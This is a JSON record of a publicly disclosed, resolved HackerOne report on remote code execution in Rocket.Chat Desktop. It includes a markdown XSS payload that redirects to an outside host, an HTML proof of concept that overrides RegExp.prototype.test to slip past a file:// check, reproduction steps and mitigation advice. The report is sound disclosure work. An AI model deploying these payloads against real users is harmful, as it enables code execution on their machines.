@@ -1,0 +1,120 @@
+{
+  "id": 276031,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNzYwMzE=",
+  "url": "https://hackerone.com/reports/276031",
+  "title": "Remote Code Execution in Rocket.Chat Desktop",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2017-10-10T06:22:44.191Z",
+  "submitted_at": "2017-10-10T06:22:44.191Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "mattaustin",
+    "url": "/mattaustin",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/002/526/c9a3feb16fa81bdfb2e976598a2ff4006a59559b_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 19858,
+    "url": "https://hackerone.com/rocket_chat",
+    "handle": "rocket_chat",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Rocket.Chat",
+      "twitter_handle": "RocketChat",
+      "website": "https://rocket.chat",
+      "about": "Rocket.Chat is a company built on open source values and a love for efficiency. The company is driven by our amazing community of contributors."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-09-18T22:00:43.878Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-08-19T22:00:40.456Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:** The Markdown parser can be tricked into allowing arbitrary Javascript leading to \"remote code execution\". \n\n**Description:** \nBy combining the \"link\" and inline code block we can trick the parser into breaking out of the current HTML attribute. \n\nThis allows us to control other attributes of the tag and trigger javascript events. \n```\n[ hax ](http://hax//onmouseover=location='https://maustin.net/hax/rocket/hack.html';\"`hax`zzz)\n```\nbecomes \n```html\n<a href=\"&lt;a href=\" http:=\"\" hax=\"\" onmouseover=\"location='https://maustin.net/hax/rocket/hack.html';&quot;&quot;\" target=\"_blank\" rel=\"noopener noreferrer\">\n```\n\nThis is a simple redirect to: https://maustin.net/hax/rocket/hack.html\n\nFrom this point the goal is to get the application to call shell.openExternal(href); with a URL we control. Thats because: \n>      \"open 'file://localhost/Volumes/Macintosh HD/foo.txt'\" opens the document\n     in the default application for its type (as determined by LaunchSer-\n     vices).\n\nNote:  For this demo I point to file:///Applications/Calculator.app however if you point to a public NFS or SMB server on windows this executable can be controlled by the attacker. (example at: file:///net/192.241.239.91/var/nfs/general/hack2.app)\n\nIn https://github.com/RocketChat/Rocket.Chat.Electron/blob/master/src/public/preload.js#L45 all links are hooked and some patter matching is used to check before firing them off to shell.openExternal(href); \n\nNormally preload javascript is an \"isolated scope\" in this case however the code is directly attached to the user controlled DOM as the \"window.onload\" handler. This means we can overload some global objects and methods including the RegExp.prototype.test method. Now we can bypass the file:\\\\/\\\\/ check send our application path to openExternal.\n\n```html\n<!DOCTYPE html>\n<html>\n    <head>\n      <script>\n        RegExp.prototype.test = new Proxy(RegExp.prototype.test, {\n          apply: function(target, thisArg, argumentsList) {\n            console.log(thisArg.source);\n          console.log(argumentsList[0]);\n          if((thisArg.source == '^file:\\\\/\\\\/.+') && (argumentsList[0] === 'file:///Applications/Calculator.app')){\n            return false;\n          }\n          return Reflect.apply(target, thisArg, argumentsList)\n          }\n        });\n        setTimeout(()=>{\n            a = document.createElement(\"A\")\n            a.href=\"file:///Applications/Calculator.app\"\n            document.body.appendChild(a)\n            a.click()\n        }, 3000);\n      </script>\n    </head>\n    <body>\n     <h1>3...2...1...🚀</h1>\n    </body>\n</html>\n```\n\n## Releases Affected:\n\n  * >= 2.9.0\n\n## Steps To Reproduce (from initial installation to vulnerability):\n\n  1. Create a new channel to test in. \n  1. Send the following snippet of markdown: \n```\n[ hax ](http://hax//onmouseover=location='https://maustin.net/hax/rocket/hack.html';\"`hax`zzz)\n```\n  1. Move your mouse over the link you just send and \n\n## Supporting Material/References:\n\n  * https://youtu.be/HPlwlc2J-LQ\n\n## Suggested mitigation\n\n  * The markdown parser needs a little love to prevent the initial xss. \n  * I believe you should be able to use something like  `window.addEventListener(\"load\",` .. to execute the checks in the proper scope. \n",
+  "weakness": {
+    "id": 70,
+    "name": "Code Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2018-09-18T22:00:40.574Z",
+  "allow_singular_disclosure_after": -241032177.56358704,
+  "singular_disclosure_allowed": true,
+  "vote_count": 12,
+  "voters": [
+    "8ayac",
+    "ali",
+    "mattaustin",
+    "michael1026",
+    "dmatrix",
+    "secgeek",
+    "eveeez",
+    "user_name2023",
+    "cryptographer",
+    "jatacheers",
+    "and 2 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
